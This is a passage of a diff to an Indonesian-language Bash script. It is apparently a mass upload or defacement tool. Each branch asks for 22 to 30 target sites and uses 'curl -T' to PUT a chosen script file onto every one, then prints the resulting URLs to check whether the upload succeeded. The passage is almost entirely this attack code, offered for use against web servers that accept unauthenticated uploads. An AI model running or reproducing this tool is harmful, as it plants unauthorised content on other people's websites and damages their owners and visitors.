+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+read -p ' Target kelima : ' ke5
+read -p ' Target keenam : ' ke6
+read -p ' Target ketujuh : ' ke7
+read -p ' Target kedelapan : ' ke8
+read -p ' Target kesembilan : ' ke9
+read -p ' Target kesepuluh : ' ke10
+read -p ' Target kesebelas : ' ke11
+read -p ' Target keduabelas : ' ke12
+read -p ' Target ketigabelas : ' ke13
+read -p ' Target keempatbelas : ' ke14
+read -p ' Target kelimabelas : ' ke15
+read -p ' Target keenambelas : ' ke16
+read -p ' Target ketujuhbelas : ' ke17
+read -p ' Target kedelapanbelas : ' ke18
+read -p ' Target kesembilanbelas : ' ke19
+read -p ' Target keduapuluh : ' ke20
+read -p ' Target keduapuluh-satu : ' ke21
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+curl -T $alamat/$sc $ke6
+curl -T $alamat/$sc $ke7
+curl -T $alamat/$sc $ke8
+curl -T $alamat/$sc $ke9
+curl -T $alamat/$sc $ke10
+curl -T $alamat/$sc $ke11
+curl -T $alamat/$sc $ke12
+curl -T $alamat/$sc $ke13
+curl -T $alamat/$sc $ke14
+curl -T $alamat/$sc $ke15
+curl -T $alamat/$sc $ke15
+curl -T $alamat/$sc $ke16
+curl -T $alamat/$sc $ke17
+curl -T $alamat/$sc $ke18
+curl -T $alamat/$sc $ke19
+curl -T $alamat/$sc $ke20
+curl -T $alamat/$sc $ke21
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo "Cek : $ke6/$sc"
+echo "Cek : $ke7/$sc"
+echo "Cek : $ke8/$sc"
+echo "Cek : $ke9/$sc"
+echo "Cek : $ke10/$sc"
+echo "Cek : $ke11/$sc"
+echo "Cek : $ke12/$sc"
+echo "Cek : $ke13/$sc"
+echo "Cek : $ke14/$sc"
+echo "Cek : $ke15/$sc"
+echo "Cek : $ke16/$sc"
+echo "Cek : $ke17/$sc"
+echo "Cek : $ke18/$sc"
+echo "Cek : $ke19/$sc"
+echo "Cek : $ke20/$sc"
+echo "Cek : $ke21/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 22 ]
+then
+clear
+echo -e $g ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+read -p ' Target kelima : ' ke5
+read -p ' Target keenam : ' ke6
+read -p ' Target ketujuh : ' ke7
+read -p ' Target kedelapan : ' ke8
+read -p ' Target kesembilan : ' ke9
+read -p ' Target kesepuluh : ' ke10
+read -p ' Target kesebelas : ' ke11
+read -p ' Target keduabelas : ' ke12
+read -p ' Target ketigabelas : ' ke13
+read -p ' Target keempatbelas : ' ke14
+read -p ' Target kelimabelas : ' ke15
+read -p ' Target keenambelas : ' ke16
+read -p ' Target ketujuhbelas : ' ke17
+read -p ' Target kedelapanbelas : ' ke18
+read -p ' Target kesembilanbelas : ' ke19
+read -p ' Target keduapuluh : ' ke20
+read -p ' Target keduapuluh-satu : ' ke21
+read -p ' Target keduapuluh-dua : ' ke22
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+curl -T $alamat/$sc $ke6
+curl -T $alamat/$sc $ke7
+curl -T $alamat/$sc $ke8
+curl -T $alamat/$sc $ke9
+curl -T $alamat/$sc $ke10
+curl -T $alamat/$sc $ke11
+curl -T $alamat/$sc $ke12
+curl -T $alamat/$sc $ke13
+curl -T $alamat/$sc $ke14
+curl -T $alamat/$sc $ke15
+curl -T $alamat/$sc $ke16
+curl -T $alamat/$sc $ke17
+curl -T $alamat/$sc $ke18
+curl -T $alamat/$sc $ke19
+curl -T $alamat/$sc $ke20
+curl -T $alamat/$sc $ke21
+curl -T $alamat/$sc $ke22
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo "Cek : $ke6/$sc"
+echo "Cek : $ke7/$sc"
+echo "Cek : $ke8/$sc"
+echo "Cek : $ke9/$sc"
+echo "Cek : $ke10/$sc"
+echo "Cek : $ke11/$sc"
+echo "Cek : $ke12/$sc"
+echo "Cek : $ke13/$sc"
+echo "Cek : $ke14/$sc"
+echo "Cek : $ke15/$sc"
+echo "Cek : $ke16/$sc"
+echo "Cek : $ke17/$sc"
+echo "Cek : $ke18/$sc"
+echo "Cek : $ke19/$sc"
+echo "Cek : $ke20/$sc"
+echo "Cek : $ke21/$sc"
+echo "Cek : $ke22/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 23 ]
+then
+clear
+echo -e $a ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+read -p ' Target kelima : ' ke5
+read -p ' Target keenam : ' ke6
+read -p ' Target ketujuh : ' ke7
+read -p ' Target kedelapan : ' ke8
+read -p ' Target kesembilan : ' ke9
+read -p ' Target kesepuluh : ' ke10
+read -p ' Target kesebelas : ' ke11
+read -p ' Target keduabelas : ' ke12
+read -p ' Target ketigabelas : ' ke13
+read -p ' Target keempatbelas : ' ke14
+read -p ' Target kelimabelas : ' ke15
+read -p ' Target keenambelas : ' ke16
+read -p ' Target ketujuhbelas : ' ke17
+read -p ' Target kedelapanbelas : ' ke18
+read -p ' Target kesembilanbelas : ' ke19
+read -p ' Target keduapuluh : ' ke20
+read -p ' Target keduapuluh-satu : ' ke21
+read -p ' Target keduapuluh-dua : ' ke22
+read -p ' Target keduapuluh-tiga : ' ke23
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+curl -T $alamat/$sc $ke6
+curl -T $alamat/$sc $ke7
+curl -T $alamat/$sc $ke8
+curl -T $alamat/$sc $ke9
+curl -T $alamat/$sc $ke10
+curl -T $alamat/$sc $ke11
+curl -T $alamat/$sc $ke12
+curl -T $alamat/$sc $ke13
+curl -T $alamat/$sc $ke14
+curl -T $alamat/$sc $ke15
+curl -T $alamat/$sc $ke16
+curl -T $alamat/$sc $ke17
+curl -T $alamat/$sc $ke18
+curl -T $alamat/$sc $ke19
+curl -T $alamat/$sc $ke20
+curl -T $alamat/$sc $ke21
+curl -T $alamat/$sc $ke22
+curl -T $alamat/$sc $ke23
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo "Cek : $ke6/$sc"
+echo "Cek : $ke7/$sc"
+echo "Cek : $ke8/$sc"
+echo "Cek : $ke9/$sc"
+echo "Cek : $ke10/$sc"
+echo "Cek : $ke11/$sc"
+echo "Cek : $ke12/$sc"
+echo "Cek : $ke13/$sc"
+echo "Cek : $ke14/$sc"
+echo "Cek : $ke15/$sc"
+echo "Cek : $ke16/$sc"
+echo "Cek : $ke17/$sc"
+echo "Cek : $ke18/$sc"
+echo "Cek : $ke19/$sc"
+echo "Cek : $ke20/$sc"
+echo "Cek : $ke21/$sc"
+echo "Cek : $ke22/$sc"
+echo "Cek : $ke23/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 24 ]
+then
+clear
+echo -e $b ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+read -p ' Target kelima : ' ke5
+read -p ' Target keenam : ' ke6
+read -p ' Target ketujuh : ' ke7
+read -p ' Target kedelapan : ' ke8
+read -p ' Target kesembilan : ' ke9
+read -p ' Target kesepuluh : ' ke10
+read -p ' Target kesebelas : ' ke11
+read -p ' Target keduabelas : ' ke12
+read -p ' Target ketigabelas : ' ke13
+read -p ' Target keempatbelas : ' ke14
+read -p ' Target kelimabelas : ' ke15
+read -p ' Target keenambelas : ' ke16
+read -p ' Target ketujuhbelas : ' ke17
+read -p ' Target kedelapanbelas : ' ke18
+read -p ' Target kesembilanbelas : ' ke19
+read -p ' Target keduapuluh : ' ke20
+read -p ' Target keduapuluh-satu : ' ke21
+read -p ' Target keduapuluh-dua : ' ke22
+read -p ' Target keduapuluh-tiga : ' ke23
+read -p ' Target keduapuluh-empat : ' ke24
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+curl -T $alamat/$sc $ke6
+curl -T $alamat/$sc $ke7
+curl -T $alamat/$sc $ke8
+curl -T $alamat/$sc $ke9
+curl -T $alamat/$sc $ke10
+curl -T $alamat/$sc $ke11
+curl -T $alamat/$sc $ke12
+curl -T $alamat/$sc $ke13
+curl -T $alamat/$sc $ke14
+curl -T $alamat/$sc $ke15
+curl -T $alamat/$sc $ke16
+curl -T $alamat/$sc $ke17
+curl -T $alamat/$sc $ke18
+curl -T $alamat/$sc $ke19
+curl -T $alamat/$sc $ke20
+curl -T $alamat/$sc $ke21
+curl -T $alamat/$sc $ke22
+curl -T $alamat/$sc $ke23
+curl -T $alamat/$sc $ke24
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo "Cek : $ke6/$sc"
+echo "Cek : $ke7/$sc"
+echo "Cek : $ke8/$sc"
+echo "Cek : $ke9/$sc"
+echo "Cek : $ke10/$sc"
+echo "Cek : $ke11/$sc"
+echo "Cek : $ke12/$sc"
+echo "Cek : $ke13/$sc"
+echo "Cek : $ke14/$sc"
+echo "Cek : $ke15/$sc"
+echo "Cek : $ke16/$sc"
+echo "Cek : $ke17/$sc"
+echo "Cek : $ke18/$sc"
+echo "Cek : $ke19/$sc"
+echo "Cek : $ke20/$sc"
+echo "Cek : $ke21/$sc"
+echo "Cek : $ke22/$sc"
+echo "Cek : $ke23/$sc"
+echo "Cek : $ke24/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 25 ]
+then
+clear
+echo -e $c ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+read -p ' Target kelima : ' ke5
+read -p ' Target keenam : ' ke6
+read -p ' Target ketujuh : ' ke7
+read -p ' Target kedelapan : ' ke8
+read -p ' Target kesembilan : ' ke9
+read -p ' Target kesepuluh : ' ke10
+read -p ' Target kesebelas : ' ke11
+read -p ' Target keduabelas : ' ke12
+read -p ' Target ketigabelas : ' ke13
+read -p ' Target keempatbelas : ' ke14
+read -p ' Target kelimabelas : ' ke15
+read -p ' Target keenambelas : ' ke16
+read -p ' Target ketujuhbelas : ' ke17
+read -p ' Target kedelapanbelas : ' ke18
+read -p ' Target kesembilanbelas : ' ke19
+read -p ' Target keduapuluh : ' ke20
+read -p ' Target keduapuluh-satu : ' ke21
+read -p ' Target keduapuluh-dua : ' ke22
+read -p ' Target keduapuluh-tiga : ' ke23
+read -p ' Target keduapuluh-empat : ' ke24
+read -p ' Target keduapuluh-lima : ' ke25
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+curl -T $alamat/$sc $ke6
+curl -T $alamat/$sc $ke7
+curl -T $alamat/$sc $ke8
+curl -T $alamat/$sc $ke9
+curl -T $alamat/$sc $ke10
+curl -T $alamat/$sc $ke11
+curl -T $alamat/$sc $ke12
+curl -T $alamat/$sc $ke13
+curl -T $alamat/$sc $ke14
+curl -T $alamat/$sc $ke15
+curl -T $alamat/$sc $ke16
+curl -T $alamat/$sc $ke17
+curl -T $alamat/$sc $ke18
+curl -T $alamat/$sc $ke19
+curl -T $alamat/$sc $ke20
+curl -T $alamat/$sc $ke21
+curl -T $alamat/$sc $ke22
+curl -T $alamat/$sc $ke23
+curl -T $alamat/$sc $ke24
+curl -T $alamat/$sc $ke25
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo "Cek : $ke6/$sc"
+echo "Cek : $ke7/$sc"
+echo "Cek : $ke8/$sc"
+echo "Cek : $ke9/$sc"
+echo "Cek : $ke10/$sc"
+echo "Cek : $ke11/$sc"
+echo "Cek : $ke12/$sc"
+echo "Cek : $ke13/$sc"
+echo "Cek : $ke14/$sc"
+echo "Cek : $ke15/$sc"
+echo "Cek : $ke16/$sc"
+echo "Cek : $ke17/$sc"
+echo "Cek : $ke18/$sc"
+echo "Cek : $ke19/$sc"
+echo "Cek : $ke20/$sc"
+echo "Cek : $ke21/$sc"
+echo "Cek : $ke22/$sc"
+echo "Cek : $ke23/$sc"
+echo "Cek : $ke24/$sc"
+echo "Cek : $ke25/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 26 ]
+then
+clear
+echo -e $d ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+read -p ' Target kelima : ' ke5
+read -p ' Target keenam : ' ke6
+read -p ' Target ketujuh : ' ke7
+read -p ' Target kedelapan : ' ke8
+read -p ' Target kesembilan : ' ke9
+read -p ' Target kesepuluh : ' ke10
+read -p ' Target kesebelas : ' ke11
+read -p ' Target keduabelas : ' ke12
+read -p ' Target ketigabelas : ' ke13
+read -p ' Target keempatbelas : ' ke14
+read -p ' Target kelimabelas : ' ke15
+read -p ' Target keenambelas : ' ke16
+read -p ' Target ketujuhbelas : ' ke17
+read -p ' Target kedelapanbelas : ' ke18
+read -p ' Target kesembilanbelas : ' ke19
+read -p ' Target keduapuluh : ' ke20
+read -p ' Target keduapuluh-satu : ' ke21
+read -p ' Target keduapuluh-dua : ' ke22
+read -p ' Target keduapuluh-tiga : ' ke23
+read -p ' Target keduapuluh-empat : ' ke24
+read -p ' Target keduapuluh-lima : ' ke25
+read -p ' Target keduapuluh-enam : ' ke26
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+curl -T $alamat/$sc $ke6
+curl -T $alamat/$sc $ke7
+curl -T $alamat/$sc $ke8
+curl -T $alamat/$sc $ke9
+curl -T $alamat/$sc $ke10
+curl -T $alamat/$sc $ke11
+curl -T $alamat/$sc $ke12
+curl -T $alamat/$sc $ke13
+curl -T $alamat/$sc $ke14
+curl -T $alamat/$sc $ke15
+curl -T $alamat/$sc $ke16
+curl -T $alamat/$sc $ke17
+curl -T $alamat/$sc $ke18
+curl -T $alamat/$sc $ke19
+curl -T $alamat/$sc $ke20
+curl -T $alamat/$sc $ke21
+curl -T $alamat/$sc $ke22
+curl -T $alamat/$sc $ke23
+curl -T $alamat/$sc $ke24
+curl -T $alamat/$sc $ke25
+curl -T $alamat/$sc $ke26
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo "Cek : $ke6/$sc"
+echo "Cek : $ke7/$sc"
+echo "Cek : $ke8/$sc"
+echo "Cek : $ke9/$sc"
+echo "Cek : $ke10/$sc"
+echo "Cek : $ke11/$sc"
+echo "Cek : $ke12/$sc"
+echo "Cek : $ke13/$sc"
+echo "Cek : $ke14/$sc"
+echo "Cek : $ke15/$sc"
+echo "Cek : $ke16/$sc"
+echo "Cek : $ke17/$sc"
+echo "Cek : $ke18/$sc"
+echo "Cek : $ke19/$sc"
+echo "Cek : $ke20/$sc"
+echo "Cek : $ke21/$sc"
+echo "Cek : $ke22/$sc"
+echo "Cek : $ke23/$sc"
+echo "Cek : $ke24/$sc"
+echo "Cek : $ke25/$sc"
+echo "Cek : $ke26/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 27 ]
+then
+clear
+echo -e $e ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+read -p ' Target kelima : ' ke5
+read -p ' Target keenam : ' ke6
+read -p ' Target ketujuh : ' ke7
+read -p ' Target kedelapan : ' ke8
+read -p ' Target kesembilan : ' ke9
+read -p ' Target kesepuluh : ' ke10
+read -p ' Target kesebelas : ' ke11
+read -p ' Target keduabelas : ' ke12
+read -p ' Target ketigabelas : ' ke13
+read -p ' Target keempatbelas : ' ke14
+read -p ' Target kelimabelas : ' ke15
+read -p ' Target keenambelas : ' ke16
+read -p ' Target ketujuhbelas : ' ke17
+read -p ' Target kedelapanbelas : ' ke18
+read -p ' Target kesembilanbelas : ' ke19
+read -p ' Target keduapuluh : ' ke20
+read -p ' Target keduapuluh-satu : ' ke21
+read -p ' Target keduapuluh-dua : ' ke22
+read -p ' Target keduapuluh-tiga : ' ke23
+read -p ' Target keduapuluh-empat : ' ke24
+read -p ' Target keduapuluh-lima : ' ke25
+read -p ' Target keduapuluh-enam : ' ke26
+read -p ' Target keduapuluh-tujuh : ' ke27
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+curl -T $alamat/$sc $ke6
+curl -T $alamat/$sc $ke7
+curl -T $alamat/$sc $ke8
+curl -T $alamat/$sc $ke9
+curl -T $alamat/$sc $ke10
+curl -T $alamat/$sc $ke11
+curl -T $alamat/$sc $ke12
+curl -T $alamat/$sc $ke13
+curl -T $alamat/$sc $ke14
+curl -T $alamat/$sc $ke15
+curl -T $alamat/$sc $ke16
+curl -T $alamat/$sc $ke17
+curl -T $alamat/$sc $ke18
+curl -T $alamat/$sc $ke19
+curl -T $alamat/$sc $ke20
+curl -T $alamat/$sc $ke21
+curl -T $alamat/$sc $ke22
+curl -T $alamat/$sc $ke23
+curl -T $alamat/$sc $ke24
+curl -T $alamat/$sc $ke25
+curl -T $alamat/$sc $ke26
+curl -T $alamat/$sc $ke27
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo "Cek : $ke6/$sc"
+echo "Cek : $ke7/$sc"
+echo "Cek : $ke8/$sc"
+echo "Cek : $ke9/$sc"
+echo "Cek : $ke10/$sc"
+echo "Cek : $ke11/$sc"
+echo "Cek : $ke12/$sc"
+echo "Cek : $ke13/$sc"
+echo "Cek : $ke14/$sc"
+echo "Cek : $ke15/$sc"
+echo "Cek : $ke16/$sc"
+echo "Cek : $ke17/$sc"
+echo "Cek : $ke18/$sc"
+echo "Cek : $ke19/$sc"
+echo "Cek : $ke20/$sc"
+echo "Cek : $ke21/$sc"
+echo "Cek : $ke22/$sc"
+echo "Cek : $ke23/$sc"
+echo "Cek : $ke24/$sc"
+echo "Cek : $ke25/$sc"
+echo "Cek : $ke26/$sc"
+echo "Cek : $ke27/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 28 ]
+then
+clear
+echo -e $f ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+read -p ' Target kelima : ' ke5
+read -p ' Target keenam : ' ke6
+read -p ' Target ketujuh : ' ke7
+read -p ' Target kedelapan : ' ke8
+read -p ' Target kesembilan : ' ke9
+read -p ' Target kesepuluh : ' ke10
+read -p ' Target kesebelas : ' ke11
+read -p ' Target keduabelas : ' ke12
+read -p ' Target ketigabelas : ' ke13
+read -p ' Target keempatbelas : ' ke14
+read -p ' Target kelimabelas : ' ke15
+read -p ' Target keenambelas : ' ke16
+read -p ' Target ketujuhbelas : ' ke17
+read -p ' Target kedelapanbelas : ' ke18
+read -p ' Target kesembilanbelas : ' ke19
+read -p ' Target keduapuluh : ' ke20
+read -p ' Target keduapuluh-satu : ' ke21
+read -p ' Target keduapuluh-dua : ' ke22
+read -p ' Target keduapuluh-tiga : ' ke23
+read -p ' Target keduapuluh-empat : ' ke24
+read -p ' Target keduapuluh-lima : ' ke25
+read -p ' Target keduapuluh-enam : ' ke26
+read -p ' Target keduapuluh-tujuh : ' ke27
+read -p ' Target keduapuluh-delapan : ' ke28
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+curl -T $alamat/$sc $ke6
+curl -T $alamat/$sc $ke7
+curl -T $alamat/$sc $ke8
+curl -T $alamat/$sc $ke9
+curl -T $alamat/$sc $ke10
+curl -T $alamat/$sc $ke11
+curl -T $alamat/$sc $ke12
+curl -T $alamat/$sc $ke13
+curl -T $alamat/$sc $ke14
+curl -T $alamat/$sc $ke15
+curl -T $alamat/$sc $ke16
+curl -T $alamat/$sc $ke17
+curl -T $alamat/$sc $ke18
+curl -T $alamat/$sc $ke19
+curl -T $alamat/$sc $ke20
+curl -T $alamat/$sc $ke21
+curl -T $alamat/$sc $ke22
+curl -T $alamat/$sc $ke23
+curl -T $alamat/$sc $ke24
+curl -T $alamat/$sc $ke25
+curl -T $alamat/$sc $ke26
+curl -T $alamat/$sc $ke27
+curl -T $alamat/$sc $ke28
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo "Cek : $ke6/$sc"
+echo "Cek : $ke7/$sc"
+echo "Cek : $ke8/$sc"
+echo "Cek : $ke9/$sc"
+echo "Cek : $ke10/$sc"
+echo "Cek : $ke11/$sc"
+echo "Cek : $ke12/$sc"
+echo "Cek : $ke13/$sc"
+echo "Cek : $ke14/$sc"
+echo "Cek : $ke15/$sc"
+echo "Cek : $ke16/$sc"
+echo "Cek : $ke17/$sc"
+echo "Cek : $ke18/$sc"
+echo "Cek : $ke19/$sc"
+echo "Cek : $ke20/$sc"
+echo "Cek : $ke21/$sc"
+echo "Cek : $ke22/$sc"
+echo "Cek : $ke23/$sc"
+echo "Cek : $ke24/$sc"
+echo "Cek : $ke25/$sc"
+echo "Cek : $ke26/$sc"
+echo "Cek : $ke27/$sc"
+echo "Cek : $ke28/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 29 ]
+then
+clear
+echo -e $g ''
+cat BPI.txt
+read -p ' Target pertama : ' ke1
+read -p ' Target kedua : ' ke2
+read -p ' Target ketiga : ' ke3
+read -p ' Target keempat : ' ke4
+read -p ' Target kelima : ' ke5
+read -p ' Target keenam : ' ke6
+read -p ' Target ketujuh : ' ke7
+read -p ' Target kedelapan : ' ke8
+read -p ' Target kesembilan : ' ke9
+read -p ' Target kesepuluh : ' ke10
+read -p ' Target kesebelas : ' ke11
+read -p ' Target keduabelas : ' ke12
+read -p ' Target ketigabelas : ' ke13
+read -p ' Target keempatbelas : ' ke14
+read -p ' Target kelimabelas : ' ke15
+read -p ' Target keenambelas : ' ke16
+read -p ' Target ketujuhbelas : ' ke17
+read -p ' Target kedelapanbelas : ' ke18
+read -p ' Target kesembilanbelas : ' ke19
+read -p ' Target keduapuluh : ' ke20
+read -p ' Target keduapuluh-satu : ' ke21
+read -p ' Target keduapuluh-dua : ' ke22
+read -p ' Target keduapuluh-tiga : ' ke23
+read -p ' Target keduapuluh-empat : ' ke24
+read -p ' Target keduapuluh-lima : ' ke25
+read -p ' Target keduapuluh-enam : ' ke26
+read -p ' Target keduapuluh-tujuh : ' ke27
+read -p ' Target keduapuluh-delapan : ' ke28
+read -p ' Target keduapuluh-sembilan : ' ke29
+echo '========[Proses]========'
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+curl -T $alamat/$sc $ke6
+curl -T $alamat/$sc $ke7
+curl -T $alamat/$sc $ke8
+curl -T $alamat/$sc $ke9
+curl -T $alamat/$sc $ke10
+curl -T $alamat/$sc $ke11
+curl -T $alamat/$sc $ke12
+curl -T $alamat/$sc $ke13
+curl -T $alamat/$sc $ke14
+curl -T $alamat/$sc $ke15
+curl -T $alamat/$sc $ke16
+curl -T $alamat/$sc $ke17
+curl -T $alamat/$sc $ke18
+curl -T $alamat/$sc $ke19
+curl -T $alamat/$sc $ke20
+curl -T $alamat/$sc $ke21
+curl -T $alamat/$sc $ke22
+curl -T $alamat/$sc $ke23
+curl -T $alamat/$sc $ke24
+curl -T $alamat/$sc $ke25
+curl -T $alamat/$sc $ke26
+curl -T $alamat/$sc $ke27
+curl -T $alamat/$sc $ke28
+curl -T $alamat/$sc $ke29
+echo '========[Selesai]========'
+echo "Cek : $ke1/$sc"
+echo "Cek : $ke2/$sc"
+echo "Cek : $ke3/$sc"
+echo "Cek : $ke4/$sc"
+echo "Cek : $ke5/$sc"
+echo "Cek : $ke6/$sc"
+echo "Cek : $ke7/$sc"
+echo "Cek : $ke8/$sc"
+echo "Cek : $ke9/$sc"
+echo "Cek : $ke10/$sc"
+echo "Cek : $ke11/$sc"
+echo "Cek : $ke12/$sc"
+echo "Cek : $ke13/$sc"
+echo "Cek : $ke14/$sc"
+echo "Cek : $ke15/$sc"
+echo "Cek : $ke16/$sc"
+echo "Cek : $ke17/$sc"
+echo "Cek : $ke18/$sc"
+echo "Cek : $ke19/$sc"
+echo "Cek : $ke20/$sc"
+echo "Cek : $ke21/$sc"
+echo "Cek : $ke22/$sc"
+echo "Cek : $ke23/$sc"
+echo "Cek : $ke24/$sc"
+echo "Cek : $ke25/$sc"
+echo "Cek : $ke26/$sc"
+echo "Cek : $ke27/$sc"
+echo "Cek : $ke28/$sc"
+echo "Cek : $ke29/$sc"
+echo 'Jika Tidak bisa diAkses Berarti Gagal'
+echo 'Bay-Bay'
+fi
+
+if [ $ju = 30 ]
+then
+clear
+cat BPI.txt | lolcat
+echo -e $a ''
+read -p ' Target pertama : ' ke1
+echo -e $b ''
+read -p ' Target kedua : ' ke2
+echo -e $c ''
+read -p ' Target ketiga : ' ke3
+echo -e $d ''
+read -p ' Target keempat : ' ke4
+echo -e $e ''
+read -p ' Target kelima : ' ke5
+echo -e $f ''
+read -p ' Target keenam : ' ke6
+echo -e $g ''
+read -p ' Target ketujuh : ' ke7
+echo -e $a ''
+read -p ' Target kedelapan : ' ke8
+echo -e $b ''
+read -p ' Target kesembilan : ' ke9
+echo -e $c ''
+read -p ' Target kesepuluh : ' ke10
+echo -e $d ''
+read -p ' Target kesebelas : ' ke11
+echo -e $e ''
+read -p ' Target keduabelas : ' ke12
+echo -e $f ''
+read -p ' Target ketigabelas : ' ke13
+echo -e $g ''
+read -p ' Target keempatbelas : ' ke14
+echo -e $a ''
+read -p ' Target kelimabelas : ' ke15
+echo -e $b ''
+read -p ' Target keenambelas : ' ke16
+echo -e $c ''
+read -p ' Target ketujuhbelas : ' ke17
+echo -e $d ''
+read -p ' Target kedelapanbelas : ' ke18
+echo -e $e ''
+read -p ' Target kesembilanbelas : ' ke19
+echo -e $f ''
+read -p ' Target keduapuluh : ' ke20
+echo -e $g ''
+read -p ' Target keduapuluh-satu : ' ke21
+echo -e $a ''
+read -p ' Target keduapuluh-dua : ' ke22
+echo -e $b ''
+read -p ' Target keduapuluh-tiga : ' ke23
+echo -e $c ''
+read -p ' Target keduapuluh-empat : ' ke24
+echo -e $d ''
+read -p ' Target keduapuluh-lima : ' ke25
+echo -e $e ''
+read -p ' Target keduapuluh-enam : ' ke26
+echo -e $f ''
+read -p ' Target keduapuluh-tujuh : ' ke27
+echo -e $g ''
+read -p ' Target keduapuluh-delapan : ' ke28
+echo -e $a ''
+read -p ' Target keduapuluh-sembilan : ' ke29
+echo -e $b ''
+read -p ' Target ketigapuluh : ' ke30
+echo '========[Proses]========' | lolcat
+echo -e $c ''
+curl -T $alamat/$sc $ke1
+curl -T $alamat/$sc $ke2
+curl -T $alamat/$sc $ke3
+echo -e $d ''
+curl -T $alamat/$sc $ke4
+curl -T $alamat/$sc $ke5
+curl -T $alamat/$sc $ke6
+echo -e $e ''
+curl -T $alamat/$sc $ke7
+curl -T $alamat/$sc $ke8
